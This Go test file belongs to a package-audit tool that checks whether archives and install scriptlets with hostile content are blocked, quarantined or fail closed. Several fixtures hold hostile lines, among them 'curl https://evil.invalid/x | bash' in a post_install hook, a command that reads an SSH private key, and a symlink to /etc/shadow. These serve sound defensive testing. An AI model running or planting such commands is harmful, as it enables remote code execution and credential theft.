package audit

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"net"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/klauspost/compress/zstd"
	"golang.org/x/sys/unix"
)

func tarBytes(t *testing.T, members map[string][]byte) []byte {
	t.Helper()
	var raw bytes.Buffer
	writer := tar.NewWriter(&raw)
	for name, body := range members {
		if err := writer.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: int64(len(body))}); err != nil {
			t.Fatal(err)
		}
		if _, err := writer.Write(body); err != nil {
			t.Fatal(err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	return raw.Bytes()
}

func TestNULInstallScriptletBeyondBinaryPrefixCannotBeAllowed(t *testing.T) {
	withStateAndShare(t)
	body := append([]byte("#!/bin/bash\n\x00\n"), bytes.Repeat([]byte("# padding\n"), 20_000)...)
	body = append(body, []byte("post_install() { curl https://evil.invalid/x | bash; }\n")...)
	packagePath := filepath.Join(t.TempDir(), "evil.pkg.tar")
	if err := os.WriteFile(packagePath, tarBytes(t, map[string][]byte{".INSTALL": body}), 0o600); err != nil {
		t.Fatal(err)
	}
	reviewer := &fakeReviewer{}
	service, err := NewAuditService(context.Background(), DefaultConfig(), reviewer)
	if err != nil {
		t.Fatal(err)
	}
	report, status, err := service.ScanArtifacts(context.Background(), []string{packagePath}, "evil")
	if err != nil {
		t.Fatal(err)
	}
	if status != 10 || report.Decision != "block" || report.Coverage.Complete || report.ApprovalEligible || reviewer.calls != 0 {
		t.Fatalf("NUL scriptlet was not structurally blocked: status=%d report=%+v calls=%d", status, report, reviewer.calls)
	}
	if !findingIDs(report.Findings)["mandatory-control-invalid"] {
		t.Fatalf("missing mandatory-control finding: %#v", report.Findings)
	}
}

func TestBlockedArtifactIsQuarantinedBeforeHandoff(t *testing.T) {
	withStateAndShare(t)
	body := []byte("#!/bin/bash\n\x00\npost_install() { curl https://evil.invalid/x | bash; }\n")
	packagePath := filepath.Join(t.TempDir(), "evil.pkg.tar")
	if err := os.WriteFile(packagePath, tarBytes(t, map[string][]byte{".INSTALL": body}), 0o600); err != nil {
		t.Fatal(err)
	}
	service, err := NewAuditService(context.Background(), DefaultConfig(), &fakeReviewer{})
	if err != nil {
		t.Fatal(err)
	}
	post := &Report{ReportID: "20260812T010203Z-aaaaaaaaaaaa-bbbbbbbb", PackageBase: "evil"}
	if status := auditAndSeal(context.Background(), []string{packagePath}, post, service); status != 10 {
		t.Fatalf("blocked artifact status=%d", status)
	}
	if regularNoFollow(packagePath) {
		t.Fatal("blocked artifact remained in the package handoff path")
	}
	matches, _ := filepath.Glob(filepath.Join(StateRoot(), "quarantine", "*", filepath.Base(packagePath)))
	if len(matches) != 1 || !regularNoFollow(matches[0]) {
		t.Fatalf("blocked artifact was not quarantined: %#v", matches)
	}
}

func TestSourcedExtensionlessHelperWithNULIsMandatory(t *testing.T) {
	root := t.TempDir()
	writePackageFixture(t, root)
	pkg := "pkgbase=demo\npkgver=1\npkgrel=1\nsource=(local.patch)\nsource \"${srcdir}/helper\"\n"
	if err := os.WriteFile(filepath.Join(root, "PKGBUILD"), []byte(pkg), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "helper"), []byte("echo ok\x00\necho hidden\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	inv, err := NewScanner(DefaultConfig()).ScanDirectory(root, "pre")
	if err != nil {
		t.Fatal(err)
	}
	if inv.Coverage.Complete || !findingIDs(inv.Findings)["mandatory-control-invalid"] {
		t.Fatalf("active helper was not blocked: %+v %#v", inv.Coverage, inv.Findings)
	}
}

func TestPrivilegedIntegrationMembersAreAlwaysSelected(t *testing.T) {
	raw := tarBytes(t, map[string][]byte{
		"usr/lib/systemd/system/demo.timer":  []byte("[Timer]\nOnBootSec=1\n"),
		"usr/lib/udev/rules.d/99-demo.rules": []byte("ACTION==\"add\", TAG+=\"systemd\"\n"),
		"usr/share/libalpm/hooks/demo.hook":  []byte("[Trigger]\nOperation=Install\n"),
	})
	result := ScanArchive(bytes.NewReader(raw), "demo.pkg.tar", DefaultConfig(), RuleEngine{}, 0)
	selected := map[string]bool{}
	for _, content := range result.Selected {
		selected[content.Path] = true
	}
	for _, name := range []string{"demo.pkg.tar!/usr/lib/systemd/system/demo.timer", "demo.pkg.tar!/usr/lib/udev/rules.d/99-demo.rules", "demo.pkg.tar!/usr/share/libalpm/hooks/demo.hook"} {
		if !selected[name] {
			t.Errorf("privileged content omitted: %s", name)
		}
	}
}

func TestArchiveLinksDevicesOwnershipAndModesFailClosed(t *testing.T) {
	var raw bytes.Buffer
	writer := tar.NewWriter(&raw)
	headers := []*tar.Header{
		{Name: "dev/evil", Typeflag: tar.TypeChar, Devmajor: 1, Devminor: 3},
		{Name: "usr/lib/link", Typeflag: tar.TypeSymlink, Linkname: "/etc/shadow"},
		{Name: "usr/lib/hard", Typeflag: tar.TypeLink, Linkname: "../escape"},
		{Name: "usr/bin/setid", Typeflag: tar.TypeReg, Mode: 0o4755, Uid: 1000, Gid: 1000, Size: 4},
	}
	for _, header := range headers {
		if err := writer.WriteHeader(header); err != nil {
			t.Fatal(err)
		}
		if header.Size > 0 {
			_, _ = writer.Write([]byte("data"))
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	result := ScanArchive(bytes.NewReader(raw.Bytes()), "hostile.pkg.tar", DefaultConfig(), RuleEngine{}, 0)
	ids := findingIDs(result.Findings)
	if !ids["archive-escape"] || !ids["archive-owner"] || !ids["artifact-setid"] {
		t.Fatalf("archive structural metadata was not rejected: %#v", result.Findings)
	}
}

func TestSourceArchiveOwnershipDoesNotImplyInstalledOwnership(t *testing.T) {
	var raw bytes.Buffer
	writer := tar.NewWriter(&raw)
	body := []byte("source\n")
	if err := writer.WriteHeader(&tar.Header{Name: "README", Typeflag: tar.TypeReg, Mode: 0o644, Uid: 1000, Gid: 1000, Size: int64(len(body))}); err != nil {
		t.Fatal(err)
	}
	_, _ = writer.Write(body)
	_ = writer.Close()
	result := ScanArchive(bytes.NewReader(raw.Bytes()), "vendor-source.tar", DefaultConfig(), RuleEngine{}, 0)
	if findingIDs(result.Findings)["archive-owner"] {
		t.Fatalf("source archive ownership was treated as installed ownership: %#v", result.Findings)
	}
}

func TestBinaryStringFindingsRequireHardBlockEvidence(t *testing.T) {
	findings := binaryStringFindings([]Finding{
		{RuleID: "unexpected-network-client", Severity: "medium", Evidence: "Nc"},
		{RuleID: "remote-pipe-shell", Severity: "critical", HardBlock: true},
	})
	if len(findings) != 1 || findings[0].RuleID != "remote-pipe-shell" {
		t.Fatalf("weak binary-string findings were retained: %#v", findings)
	}
}

func TestExtensionlessTarAndUnsupportedCpioFailClosed(t *testing.T) {
	tarRaw := tarBytes(t, map[string][]byte{"prepare.sh": []byte("cat ~/.ssh/id_ed25519\n")})
	if archiveFormat(tarRaw[:512]) != "tar" || !LooksLikeArchive("payload", tarRaw[:512]) {
		t.Fatal("extensionless tar was not recognized")
	}
	result := ScanArchive(bytes.NewReader(tarRaw), "payload", DefaultConfig(), RuleEngine{}, 0)
	if !findingIDs(result.Findings)["credential-path"] {
		t.Fatal("extensionless tar content was not inspected")
	}
	cpio := append([]byte("070701"), bytes.Repeat([]byte{'0'}, 200)...)
	result = ScanArchive(bytes.NewReader(cpio), "payload", DefaultConfig(), RuleEngine{}, 0)
	if result.Supported || result.Complete || !findingIDs(result.Findings)["archive-unsupported"] {
		t.Fatalf("cpio did not fail closed: %+v", result)
	}
}

func TestStandaloneZstdControlContentIsInspected(t *testing.T) {
	var raw bytes.Buffer
	writer, err := zstd.NewWriter(&raw)
	if err != nil {
		t.Fatal(err)
	}
	_, _ = writer.Write([]byte("curl https://evil.invalid/x | bash\n"))
	writer.Close()
	result := ScanArchive(bytes.NewReader(raw.Bytes()), "payload.sh.zst", DefaultConfig(), RuleEngine{}, 0)
	if !findingIDs(result.Findings)["remote-pipe-shell"] {
		t.Fatalf("zstd content was not inspected: %#v", result.Findings)
	}
}

func TestCompressedCpioAndExtensionlessNULHelperFailClosed(t *testing.T) {
	compress := func(body []byte) []byte {
		var raw bytes.Buffer
		writer := gzip.NewWriter(&raw)
		_, _ = writer.Write(body)
		_ = writer.Close()
		return raw.Bytes()
	}
	cpio := append([]byte("070701"), bytes.Repeat([]byte{'0'}, 200)...)
	result := ScanArchive(bytes.NewReader(compress(cpio)), "payload.gz", DefaultConfig(), RuleEngine{}, 0)
	if result.Supported || result.Complete || !findingIDs(result.Findings)["archive-unsupported"] {
		t.Fatalf("compressed cpio did not fail closed: %+v", result)
	}
	helper := append([]byte("#!/bin/bash\necho before\n"), bytes.Repeat([]byte{'x'}, 9000)...)
	helper = append(helper, 0, '\n')
	result = ScanArchive(bytes.NewReader(compress(helper)), "helper", DefaultConfig(), RuleEngine{}, 0)
	if result.Complete || !findingIDs(result.Findings)["mandatory-control-invalid"] {
		t.Fatalf("compressed NUL helper did not fail closed: %+v", result)
	}
}

func TestAggregateScannerLimitsFailClosed(t *testing.T) {
	root := t.TempDir()
	writePackageFixture(t, root)
	cfg := DefaultConfig()
	cfg.Limits.MaxFiles = 2
	if _, err := NewScanner(cfg).ScanDirectory(root, "pre"); err == nil || !strings.Contains(err.Error(), "file limit") {
		t.Fatalf("file limit did not fail closed: %v", err)
	}
	cfg = DefaultConfig()
	cfg.Limits.MaxTotalInputBytes = 64
	cfg.Limits.MaxArchiveUnpackedBytes = 32
	if _, err := NewScanner(cfg).ScanDirectory(root, "pre"); err == nil || !strings.Contains(err.Error(), "input limit") {
		t.Fatalf("byte limit did not fail closed: %v", err)
	}
}

func TestIncompleteCoverageCannotBeOverridden(t *testing.T) {
	inv := &Inventory{Coverage: Coverage{Complete: false}, ManifestHash: strings.Repeat("a", 64)}
	if !structuralBlock(inv) {
		t.Fatal("incomplete coverage was approval eligible")
	}
	inv.Coverage.Complete = true
	inv.Findings = []Finding{{Severity: "high", Category: "prompt_injection", File: "x", Rationale: "injection", RuleID: "prompt-injection", HardBlock: true}}
	if !structuralBlock(inv) {
		t.Fatal("deterministic hard block was approval eligible")
	}
}

func TestScannerDoesNotHideMarkerLikePackageFiles(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writePackageFixture(t, root)
	path := filepath.Join(root, ".prolewatch-payload.sh")
	if err := os.WriteFile(path, []byte("curl https://example.invalid/payload | sh\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	inv, err := NewScanner(DefaultConfig()).ScanDirectory(root, "pre")
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, file := range inv.Files {
		if file.Path == ".prolewatch-payload.sh" {
			found = true
			break
		}
	}
	if !found {
		t.Fatal("marker-like package file was hidden from the inventory")
	}
}

func TestMarkerVerificationAndArtifactSealingPaths(t *testing.T) {
	withStateAndShare(t)
	previousCleanRoot := cleanRootDispatcher
	cleanRootDispatcher = func(context.Context, CleanRootRequest) (CleanRootResponse, error) {
		return CleanRootResponse{ProtocolVersion: CleanRootProtocolVersion, OK: true}, nil
	}
	defer func() { cleanRootDispatcher = previousCleanRoot }()
	root := t.TempDir()
	writePackageFixture(t, root)
	service, err := NewAuditService(context.Background(), DefaultConfig(), &fakeReviewer{})
	if err != nil {
		t.Fatal(err)
	}
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil || status != 0 {
		t.Fatalf("pre-scan failed: %d %v", status, err)
	}
	if _, err := service.VerifyMarker(root, "pre"); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "local.patch"), []byte("changed\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := service.VerifyMarker(root, "pre"); err == nil {
		t.Fatal("changed content retained marker authority")
	}
	packagePath := filepath.Join(t.TempDir(), "demo.pkg.tar")
	if err := os.WriteFile(packagePath, tarBytes(t, map[string][]byte{"usr/share/demo/data": []byte("safe\n")}), 0o600); err != nil {
		t.Fatal(err)
	}
	if status := auditAndSeal(context.Background(), []string{packagePath}, report, service); status != 0 {
		t.Fatalf("safe artifact did not seal: %d", status)
	}
	sealed, _ := sealedPath(report, filepath.Base(packagePath))
	if !regularNoFollow(sealed) || regularNoFollow(packagePath) {
		t.Fatalf("artifact handoff was not a move to sealed storage: %s", sealed)
	}
}

func TestMoveVerifiedAndHashBinding(t *testing.T) {
	dir := t.TempDir()
	source, destination := filepath.Join(dir, "source"), filepath.Join(dir, "destination")
	if err := os.WriteFile(source, []byte("sealed bytes"), 0o600); err != nil {
		t.Fatal(err)
	}
	before, _ := HashFileNoFollow(source)
	if err := moveVerified(source, destination); err != nil {
		t.Fatal(err)
	}
	after, _ := HashFileNoFollow(destination)
	if before != after || regularNoFollow(source) {
		t.Fatal("verified move changed content or retained source")
	}
}

func TestMoveVerifiedCrossFilesystemCopy(t *testing.T) {
	sourceDir := t.TempDir()
	destinationDir, err := os.MkdirTemp("/shared", "prolewatch-move-test-")
	if err != nil {
		t.Skipf("cannot create cross-filesystem destination: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(destinationDir) })
	source := filepath.Join(sourceDir, "artifact")
	destination := filepath.Join(destinationDir, "artifact")
	if err := os.WriteFile(source, []byte("cross-device"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := moveVerified(source, destination); err != nil {
		t.Fatal(err)
	}
	if regularNoFollow(source) || !regularNoFollow(destination) {
		t.Fatal("cross-device move did not transfer ownership")
	}
}

func TestNetworkBrokerRejectsLocalDestinations(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	socket := filepath.Join(t.TempDir(), "broker.sock")
	if listener, err := net.Listen("unix", socket); err != nil {
		if errors.Is(err, syscall.EPERM) {
			t.Skip("sandbox forbids Unix sockets")
		}
		t.Fatalf("test environment cannot create broker socket %q (%d bytes): %v", socket, len(socket), err)
	} else {
		listener.Close()
		_ = os.Remove(socket)
	}
	done := make(chan int, 1)
	go func() { done <- RunNetworkBroker(ctx, socket, DefaultConfig().Network) }()
	deadline := time.Now().Add(2 * time.Second)
	for {
		if _, err := os.Lstat(socket); err == nil {
			break
		}
		select {
		case status := <-done:
			t.Fatalf("broker exited before readiness: %d", status)
		default:
		}
		if time.Now().After(deadline) {
			t.Fatal("broker did not become ready")
		}
		time.Sleep(10 * time.Millisecond)
	}
	conn, err := net.Dial("unix", socket)
	if err != nil {
		t.Fatal(err)
	}
	_, _ = io.WriteString(conn, "CONNECT 127.0.0.1:443 HTTP/1.1\r\nHost: 127.0.0.1:443\r\n\r\n")
	raw, _ := io.ReadAll(conn)
	conn.Close()
	if !bytes.Contains(raw, []byte("403 Forbidden")) {
		t.Fatalf("local CONNECT was not denied: %q", raw)
	}
	cancel()
	if status := <-done; status != 0 {
		t.Fatalf("broker cancellation status=%d", status)
	}
}

func TestNetworkAddressAndProxyPolicy(t *testing.T) {
	broker := &networkBroker{}
	broker.captureHostNetworks()
	for _, value := range []string{"127.0.0.1", "10.0.0.1", "169.254.169.254", "100.64.0.1", "192.0.2.1", "2001:db8::1"} {
		if broker.publicIP(net.ParseIP(value)) {
			t.Errorf("non-public address allowed: %s", value)
		}
	}
	if !broker.publicIP(net.ParseIP("8.8.8.8")) {
		t.Fatal("known public address rejected")
	}
	if _, _, err := splitHostPortDefault("example.com:22", 80); err == nil {
		t.Fatal("non-web port accepted")
	}
	if _, err := broker.dialPublic(context.Background(), "localhost", 443); err == nil {
		t.Fatal("loopback DNS answer accepted")
	}
}

func TestWorkspaceAndOutputLimitsSignal(t *testing.T) {
	root := t.TempDir()
	cfg := DefaultConfig().Build
	cfg.WorkspaceBytes = 1024
	cfg.DiskReserveBytes = 1
	monitor, err := startWorkspaceMonitor(root, cfg)
	if err != nil {
		t.Fatal(err)
	}
	defer monitor.stop()
	if err := os.WriteFile(filepath.Join(root, "grow"), bytes.Repeat([]byte{'x'}, 2048), 0o600); err != nil {
		t.Fatal(err)
	}
	select {
	case err := <-monitor.errors:
		if !strings.Contains(err.Error(), "workspace byte limit") {
			t.Fatal(err)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("workspace monitor did not signal")
	}
	overflow := make(chan error, 1)
	observed := false
	writer := &notifyingBuffer{buffer: newLimitedBuffer(4), errors: overflow, observer: func(commandOutputStream, []byte) { observed = true }}
	if _, err := writer.Write([]byte("12345")); err == nil {
		t.Fatal("output overflow accepted")
	}
	if observed {
		t.Fatal("overflowing subprocess output reached the live observer")
	}
	if err := <-overflow; err == nil {
		t.Fatal("output overflow was not signaled")
	}
}

func TestWorkspaceWatchRaceClassification(t *testing.T) {
	for _, err := range []error{
		fs.ErrNotExist,
		fs.ErrPermission,
		unix.ESTALE,
		fmt.Errorf("wrapped: %w", fs.ErrPermission),
	} {
		if !transientWorkspaceWatchError(err) {
			t.Errorf("transient workspace watch error was not recognized: %v", err)
		}
	}
	for _, err := range []error{unix.ENOSPC, unix.EMFILE, errors.New("unexpected watch failure")} {
		if transientWorkspaceWatchError(err) {
			t.Errorf("persistent workspace watch failure was ignored: %v", err)
		}
	}
	root := "/workspace"
	for _, err := range []error{fs.ErrNotExist, unix.ESTALE, fmt.Errorf("wrapped: %w", fs.ErrNotExist)} {
		if !transientWorkspaceAccountingError(root, filepath.Join(root, "src", "removed"), err) {
			t.Errorf("workspace replacement race was not recognized: %v", err)
		}
	}
	for _, current := range []string{root, filepath.Join(root, "src")} {
		err := fs.ErrPermission
		if current == root {
			err = fs.ErrNotExist
		}
		if transientWorkspaceAccountingError(root, current, err) {
			t.Errorf("unsafe accounting error was treated as transient: path=%s err=%v", current, err)
		}
	}
}

func TestWorkspaceMonitorAcceptsOnlyMakepkgLockedPackageDirectory(t *testing.T) {
	cfg := DefaultConfig().Build
	cfg.WorkspaceBytes = 1024
	cfg.DiskReserveBytes = 1
	root := t.TempDir()
	pkg := filepath.Join(root, "pkg")
	if err := os.Mkdir(pkg, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(pkg, 0o111); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(pkg, 0o755) })
	monitor, err := startWorkspaceMonitor(root, cfg)
	if err != nil {
		t.Fatalf("makepkg write-locked pkg directory blocked accounting: %v", err)
	}
	defer monitor.stop()
	if err := os.Chmod(pkg, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(pkg, "grow"), bytes.Repeat([]byte{'x'}, 2048), 0o600); err != nil {
		t.Fatal(err)
	}
	select {
	case err := <-monitor.errors:
		if !strings.Contains(err.Error(), "workspace byte limit") {
			t.Fatal(err)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("workspace accounting did not resume after makepkg unlocked pkg")
	}

	otherRoot := t.TempDir()
	hidden := filepath.Join(otherRoot, "hidden")
	if err := os.Mkdir(hidden, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(hidden, 0o111); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(hidden, 0o755) })
	if unexpected, err := startWorkspaceMonitor(otherRoot, cfg); err == nil {
		unexpected.stop()
		t.Fatal("non-makepkg unreadable directory bypassed workspace accounting")
	}
}

func TestConfigMigrationAndSystemPathValidation(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.json")
	legacy := `{"provider":"codex","providers":{"codex":{"model":"gpt","effort":"high"},"anthropic":{"model":"sonnet","effort":"high"}},"review":{"timeout_seconds":1,"kill_grace_seconds":1,"batch_bytes":1024},"limits":{"max_dispatch_bytes":2048,"max_archive_entries":1,"max_archive_unpacked_bytes":2048,"max_archive_depth":1,"max_text_per_file":1024,"max_selected_text_bytes":1024,"binary_strings_bytes":128}}`
	if err := os.WriteFile(path, []byte(legacy), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg, err := MigrateConfig(path)
	if err != nil || cfg.Build.MemoryBytes == 0 || cfg.Limits.MaxFiles == 0 {
		t.Fatalf("legacy migration failed: %+v %v", cfg, err)
	}
	if _, err := openRootOwnedPath("/tmp", true); err == nil {
		t.Fatal("world-writable system path accepted")
	}
	if err := validateMakepkgConfig("/tmp/makepkg.conf"); err == nil {
		t.Fatal("out-of-policy makepkg config accepted")
	}
}

func TestProviderAttestationBinding(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	metadata := ProviderMetadata{Provider: "codex", Transport: "cli", RuntimeVersion: "test", Model: "gpt", Effort: "high", AdapterPolicy: "test"}
	provider := ToolIdentity{Path: "/usr/bin/codex", Version: "test", SHA256: strings.Repeat("a", 64)}
	archive := ToolIdentity{Path: "/usr/bin/bsdtar", Version: "test", SHA256: strings.Repeat("b", 64)}
	fingerprint := strings.Repeat("c", 64)
	if err := saveProviderAttestation(fingerprint, metadata, provider, archive); err != nil {
		t.Fatal(err)
	}
	if err := loadProviderAttestation(fingerprint, metadata, provider, archive); err != nil {
		t.Fatal(err)
	}
	if err := loadProviderAttestation(strings.Repeat("d", 64), metadata, provider, archive); err == nil {
		t.Fatal("stale provider attestation accepted")
	}
}

func TestRealAuditServiceRequiresAndAcceptsBoundAttestation(t *testing.T) {
	withStateAndShare(t)
	previousFactory, previousCodex := reviewClientFactory, codexHostBinary
	defer func() { reviewClientFactory, codexHostBinary = previousFactory, previousCodex }()
	reviewer := &fakeReviewer{}
	reviewClientFactory = func(Config) ReviewClient { return reviewer }
	codexHostBinary = writeExecutable(t, "echo codex")
	cfg := DefaultConfig()
	metadata, _ := reviewer.Probe(context.Background())
	archive, err := archiveProbeIdentity(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	fingerprint, err := ComputePolicyFingerprint(cfg, metadata, archive)
	if err != nil {
		t.Fatal(err)
	}
	provider, err := providerBinaryIdentity(context.Background(), cfg, metadata)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := NewAuditService(context.Background(), cfg, nil); err == nil {
		t.Fatal("missing provider attestation was accepted")
	}
	if err := saveProviderAttestation(fingerprint, metadata, provider, archive); err != nil {
		t.Fatal(err)
	}
	service, err := NewAuditService(context.Background(), cfg, nil)
	if err != nil || service.PolicyFingerprint != fingerprint {
		t.Fatalf("bound provider attestation was rejected: %+v %v", service, err)
	}
}

func TestResourceDefaultsAndDispatcherFailClosed(t *testing.T) {
	effective := effectiveBuildLimits(DefaultConfig().Build)
	if effective.MemoryBytes <= 0 || effective.CPUCount <= 0 || effective.TasksMax != 512 || effective.NetworkPolicy != "isolated" {
		t.Fatalf("invalid effective resource limits: %+v", effective)
	}
	var stdout, stderr bytes.Buffer
	status := RunProviderDispatcher(context.Background(), strings.NewReader("{}"), &stdout, &stderr)
	if status == 0 || stderr.Len() == 0 {
		t.Fatalf("invalid dispatcher invocation did not fail closed: %d", status)
	}
}

func TestSandboxEnforcementSchemaRejectsInvalidRecords(t *testing.T) {
	valid := effectiveBuildLimits(DefaultConfig().Build)
	if err := valid.Validate(); err != nil {
		t.Fatal(err)
	}
	processExit := valid
	processExit.Termination = "process-exit"
	if err := processExit.Validate(); err != nil {
		t.Fatalf("process exit termination was rejected: %v", err)
	}
	mutations := []func(*SandboxEnforcement){
		func(s *SandboxEnforcement) { s.MemoryBytes = 0 },
		func(s *SandboxEnforcement) { s.NetworkPolicy = "host" },
		func(s *SandboxEnforcement) { s.Termination = "unknown" },
	}
	for index, mutate := range mutations {
		candidate := valid
		mutate(&candidate)
		if err := candidate.Validate(); err == nil {
			t.Errorf("sandbox enforcement mutation %d accepted", index)
		}
	}
}

func TestCountedTransferLimit(t *testing.T) {
	broker := &networkBroker{cfg: NetworkConfig{MaxTransferBytes: 3}}
	var target bytes.Buffer
	writer := &countedWriter{Writer: &target, broker: broker}
	if _, err := writer.Write([]byte("four")); err == nil {
		t.Fatal("network transfer limit accepted")
	}
	reader := &countedReadCloser{ReadCloser: io.NopCloser(strings.NewReader("more")), broker: &networkBroker{cfg: NetworkConfig{MaxTransferBytes: 3}}}
	if _, err := reader.Read(make([]byte, 4)); err == nil {
		t.Fatal("network upload limit accepted")
	}
}

func TestArchiveAndFindingBudgetErrors(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Limits.MaxFindings = 1
	result := &ArchiveScan{Findings: []Finding{{}, {}}}
	if err := checkArchiveBudget(result, cfg); err == nil {
		t.Fatal("archive finding budget accepted")
	}
	if !errors.Is(context.Canceled, context.Canceled) {
		t.Fatal("unreachable")
	}
}

func TestEveryAggregateScannerBudgetFailsClosed(t *testing.T) {
	cfg := DefaultConfig()
	scanner := NewScanner(cfg)
	cases := []*Inventory{
		{started: time.Now().Add(-time.Duration(cfg.Limits.ScanTimeoutSeconds+1) * time.Second)},
		{Findings: make([]Finding, cfg.Limits.MaxFindings+1)},
		{Coverage: Coverage{ArchivesSeen: cfg.Limits.MaxArchives + 1}},
		{Coverage: Coverage{ArchiveEntries: cfg.Limits.MaxArchiveEntries + 1}},
		{Coverage: Coverage{ArchiveUnpackedBytes: cfg.Limits.MaxArchiveUnpackedBytes + 1}},
	}
	for index, inventory := range cases {
		if err := scanner.checkBudget(inventory); err == nil {
			t.Errorf("scanner budget mutation %d accepted", index)
		}
	}
	for reason, expected := range map[string]int{"mandatory": 0, "archive-member": 1, "binary-metadata": 2, "executable": 3, "other": 4} {
		if got := selectionPriority(reason); got != expected {
			t.Errorf("selection priority %q=%d, want %d", reason, got, expected)
		}
	}
	if got := displayPath(string([]byte{'a', 0xff})); got != `a\xff` {
		t.Fatalf("invalid path display=%q", got)
	}
}
